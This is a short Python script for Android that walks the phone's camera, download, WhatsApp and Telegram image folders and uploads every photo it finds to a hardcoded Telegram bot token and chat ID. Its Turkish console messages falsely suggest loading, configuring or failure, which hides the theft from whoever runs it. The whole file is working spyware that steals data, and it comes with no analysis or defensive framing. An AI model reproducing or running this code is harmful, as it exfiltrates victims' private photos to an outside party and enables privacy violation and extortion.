import os
import telebot

#Qw4xRate THT

BOT_TOKEN = "7823207013:AAHMEmLrDirYtnGu43gX5BR8YrgVNrrTNQU"


CHAT_ID = "6202798562"


bot = telebot.TeleBot(BOT_TOKEN)


photo_dirs = [
    "/storage/emulated/0/DCIM/",
    "/storage/emulated/0/Pictures/",
    "/storage/emulated/0/Download/",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images/",
    "/storage/emulated/0/Telegram/Telegram Images/"
]

def find_photos(directories):
    
    photo_files = []
    for directory in directories:
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    if file.lower().endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp")):
                        photo_files.append(os.path.join(root, file))
    return photo_files

def send_photos(photo_files):
    
    for photo in photo_files:
        try:
            with open(photo, "rb") as img:
                bot.send_photo(CHAT_ID, img)
            print(f"Yûkleniyorrr ")
        except Exception as e:
            print(f"Hata ")


photos = find_photos(photo_dirs)
if photos:
    send_photos(photos)
else:
    print("Yapılandırılıyor.")

print("Başarısız ")